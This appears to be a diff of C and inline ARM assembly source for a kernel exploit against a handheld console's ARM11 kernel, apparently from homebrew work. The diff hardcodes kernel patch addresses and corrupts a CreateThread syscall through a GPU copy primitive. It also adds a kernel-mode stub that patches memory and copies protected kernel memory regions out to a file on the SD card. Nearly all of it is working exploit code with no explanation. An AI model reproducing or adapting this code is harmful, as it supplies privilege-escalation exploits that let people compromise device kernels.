@@ -84,7 +84,7 @@ arm11_kernel_exploit_setup (void)
     buffer = 0x18402000;
     // 0xFFFFFE0 is just stack memory for scratch space
     svcControlMemory(0xFFFFFE0, 0x18451000, 0, 0x1000, 1, 0); // free page
-    patch_addr = *(int *)0x08F028A4;
+    patch_addr = 0xDFF83837;
     buffer[0] = 1;
     buffer[1] = patch_addr;
     buffer[2] = 0;
@@ -100,8 +100,8 @@ arm11_kernel_exploit_setup (void)
         buffer[i] = 0xE1A00000; // ARM NOP instruction
     }
     buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
-    nop_func = *(unsigned int *)0x08F02894 - 0x10000; // 0x10000 below current code
-    do_gshax_copy(*(unsigned int *)0x08F028A0 - 0x10000, 0x10000, 0xE1A00000, 0);
+    nop_func = 0x009D2000 - 0x10000; // 0x10000 below current code
+    do_gshax_copy(0x19592000 - 0x10000, 0x10000, 0xE1A00000, 0);
     nop_func ();
 
     /*
@@ -134,9 +134,8 @@ int __attribute__((naked))
 arm11_kernel_exploit_exec (int (*func)(void))
 {
 
-    __asm__ ("mov r5, %0\t\n" // R5 = 0x3D1FFC, not used. likely obfusction.
-             "svc 8\t\n" // CreateThread syscall, corrupted, args not needed
-             "bx lr\t\n" :: "r" (0x3D1FFC) : "r5");
+    __asm__ ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
+             "bx lr\t\n");
 }
 
 void
@@ -155,20 +154,39 @@ invalidate_dcache (void)
              "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
 }
 
-int __attribute__((naked))
-arm11_kernel_dump (void)
+void
+invalidate_allcache (void)
 {
-    __asm__ ("add sp, sp, #8\t\n"
-             "ldr lr, [sp], #4\t\n" ::: "lr");
+    __asm__ ("mcr p15,0,%0,c8,c5,0\t\n"
+             "mcr p15,0,%0,c8,c6,0\t\n"
+             "mcr p15,0,%0,c8,c7,0\t\n"
+             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
+}
 
+int __attribute__((noinline))
+arm11_kernel_exec (void)
+{
     // fix up memory
-    *(*(int **)0x08F028A4 + 2) = 0x8DD00CE5;
+    *(int *)0xDFF8383F = 0x8DD00CE5;
     invalidate_icache ();
-    //memcpy (0xE4410000, 0xFFFF0000, 0x1000);
+    invalidate_allcache ();
+    memcpy (0xD848F000, 0xFFF00000, 0x00038400);
+    memcpy (0xD84C7800, 0xFFF00000, 0x00038400);
+    memcpy (0xE4410000, 0xFFFF0000, 0x1000);
     invalidate_dcache ();
 
+    return 0;
+}
+
+int __attribute__((naked))
+arm11_kernel_stub (void)
+{
+    __asm__ ("add sp, sp, #8\t\n");
+
+    arm11_kernel_exec ();
+
     __asm__ ("movs r0, #0\t\n"
-             "bx lr\t\n");
+             "ldr pc, [sp], #4\t\n");
 }
 
 /********************************************//**
@@ -192,7 +210,7 @@ uvl_entry ()
     }
 
     arm11_kernel_exploit_setup ();
-    arm11_kernel_exploit_exec (arm11_kernel_dump);
+    arm11_kernel_exploit_exec (arm11_kernel_stub);
 
     IFile_Open(this, L"dmc:/mem-0xFFFF0000.bin", 6);
     //GSPGPU_FlushDataCache (buf, 0x1000);
@@ -211,9 +229,9 @@ uvl_entry ()
     }
     */
 
-    //while (1);
+    //svcSleepThread (0x6fc23ac00LL); 
 
-    svcSleepThread (0x6fc23ac00LL); // wait 30 seconds
+    //while (1);
 
     return 0;
 }
